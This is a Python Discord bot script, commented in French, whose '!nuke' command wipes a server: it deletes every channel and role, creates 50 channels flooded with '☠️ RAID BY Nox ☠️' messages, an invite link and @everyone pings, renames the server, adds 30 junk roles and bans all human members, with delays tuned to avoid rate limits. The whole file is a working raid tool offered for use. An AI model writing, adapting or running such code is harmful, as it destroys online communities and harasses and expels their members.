import discord
from discord.ext import commands
import os
import asyncio

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"{bot.user} est connecté !")

@bot.command()
async def nuke(ctx):
    if ctx.author.guild_permissions.administrator:
        await ctx.send("Nuke en cours...")
        
        # Supprimer salons et rôles (avec pauses)
        try:
            # Supprimer tous les salons
            for channel in ctx.guild.channels:
                try:
                    await channel.delete()
                    print(f"Salon {channel.name} supprimé.")
                    await asyncio.sleep(1)  # Attendre 1 seconde entre les suppressions
                except Exception as e:
                    print(f"Erreur lors de la suppression du salon {channel.name}: {str(e)}")

            # Supprimer tous les rôles sauf @everyone
            for role in ctx.guild.roles:
                if role.name != "@everyone":
                    try:
                        await role.delete()
                        print(f"Rôle {role.name} supprimé.")
                        await asyncio.sleep(0.5)  # Attendre 0.5 seconde entre les suppressions
                    except discord.Forbidden:
                        print(f"Impossible de supprimer le rôle {role.name}: Permission refusée.")
                    except Exception as e:
                        print(f"Erreur lors de la suppression du rôle {role.name}: {str(e)}")

            await ctx.send("Salons et rôles supprimés avec succès !")

            # Créer 50 salons et envoyer 5 messages dans chaque salon
            for i in range(50):
                try:
                    channel = await ctx.guild.create_text_channel(f"☠️ RAID BY Nox ☠️ {i+1}")
                    print(f"Salon {channel.name} créé.")
                    await asyncio.sleep(1)  # Attendre entre la création des salons

                    # Envoyer 5 messages dans chaque salon
                    for _ in range(5):
                        await channel.send("☠️ RAID BY Nox ☠️\nhttps://discord.gg/c8S6rtwTqR\n@everyone")
                        await asyncio.sleep(0.3)  # Petite pause pour ne pas spammer trop vite

                except Exception as e:
                    print(f"Erreur lors de la création du salon ou de l'envoi des messages : {str(e)}")

            await ctx.send("50 salons créés et messages envoyés avec succès !")

            # Renommer le serveur
            try:
                await ctx.guild.edit(name="☠️ RAID BY Nox ☠️")
                print("Serveur renommé avec succès.")
                await ctx.send("Serveur renommé avec succès !")
            except Exception as e:
                print(f"Erreur lors du renommage du serveur : {str(e)}")
                await ctx.send(f"Erreur lors du renommage du serveur : {str(e)}")

            # Créer 30 rôles
            for i in range(30):
                try:
                    await ctx.guild.create_role(name="☠️ RAID BY Nox ☠️")
                    print(f"Rôle {i+1} créé.")
                    await asyncio.sleep(0.5)  # Petite pause pour éviter de trop solliciter Discord
                except Exception as e:
                    print(f"Erreur lors de la création du rôle {i+1}: {str(e)}")
            
            await ctx.send("30 rôles créés avec succès !")

            # Bannir tous les membres sauf les bots
            for member in ctx.guild.members:
                try:
                    if not member.bot:
                        await member.ban()
                        print(f"Membre {member.name} banni.")
                        await asyncio.sleep(0.2)  # Petite pause pour éviter trop de bannissements
                except Exception as e:
                    print(f"Erreur lors du bannissement du membre {member.name}: {str(e)}")

            print("Nuke terminé.")
            await ctx.send("Le nuke est terminé. Tous les membres ont été bannis.")

        except Exception as e:
            await ctx.send(f"Une erreur est survenue pendant le nuke : {str(e)}")
            print(f"Erreur : {str(e)}")
    else:
        await ctx.send("Tu n'as pas la permission d'utiliser cette commande.")

bot.run(os.getenv("TOKEN"))
